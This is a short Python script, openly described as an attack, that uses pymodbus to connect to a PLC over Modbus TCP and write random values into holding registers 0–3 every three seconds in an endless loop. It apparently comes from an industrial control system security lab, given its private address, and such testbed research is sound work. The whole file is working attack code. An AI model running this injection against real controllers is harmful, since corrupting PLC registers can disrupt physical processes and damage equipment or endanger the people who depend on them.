#!/usr/bin/env python
"""
write_multiple_registers.py

Attack that writes random blocks of registers (addresses 0–5) every 3 seconds.
"""

import time, random
from pymodbus.client import ModbusTcpClient

PLC_HOST  = "192.168.64.1"
PLC_PORT  = 502
PLC_UNIT  = 1
START_REG = 0
COUNT     = 4       # number of registers to overwrite
INTERVAL  = 3.0     # seconds between injections

def main():
    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
    if not client.connect():
        print(f"ERROR: Cannot connect to {PLC_HOST}:{PLC_PORT}")
        return

    print(f"Writing {COUNT} random regs at {START_REG} every {INTERVAL}s...")
    try:
        while True:
            values = [random.randint(0, 65535) for _ in range(COUNT)]
            rq = client.write_registers(address=START_REG, values=values, slave=PLC_UNIT)
            if rq.isError():
                print(f"[WARN] WriteMultipleRegisters error: {rq}")
            else:
                print(f"[INFO] Injected {values} at regs {START_REG}–{START_REG+COUNT-1}")
            time.sleep(INTERVAL)
    except KeyboardInterrupt:
        print("Attack stopped.")
    finally:
        client.close()

if __name__ == "__main__":
    main()
